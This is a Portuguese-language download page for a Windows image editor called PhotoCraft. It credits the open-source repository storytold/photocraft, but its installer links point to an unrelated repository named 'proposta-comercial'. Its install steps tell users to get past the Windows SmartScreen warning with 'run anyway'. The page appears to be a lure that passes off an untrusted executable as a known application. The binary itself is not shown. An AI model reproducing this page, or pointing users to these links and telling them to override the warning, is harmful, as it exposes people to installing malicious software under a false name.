# PhotoCraft 0.8.2 para Windows

Editor de imagens gratuito e open source (camadas, máscaras, texto, PSD e fotos HEIC)
([storytold/photocraft](https://github.com/storytold/photocraft), MIT ou Apache-2.0).

## Baixar

| Seu PC | Download |
|---|---|
| **Windows 10/11** (a maioria dos PCs) | [PhotoCraft-0.8.2-Windows-x64-Setup.exe](https://github.com/izaqueotaviano/proposta-comercial/raw/main/photocraft/PhotoCraft-0.8.2-Windows-x64-Setup.exe) |
| Windows em ARM (Snapdragon) | [PhotoCraft-0.8.2-Windows-arm64-Setup.exe](https://github.com/izaqueotaviano/proposta-comercial/raw/main/photocraft/PhotoCraft-0.8.2-Windows-arm64-Setup.exe) |

## Instalar

1. Dê dois cliques no `.exe`.
2. Se aparecer "O Windows protegeu o computador", clique em **Mais informações › Executar assim mesmo**.
3. Siga as 3 telas: **Avançar › Instalar › Concluir**.

Não precisa de senha de administrador. Para desinstalar: *Configurações › Aplicativos › PhotoCraft*.
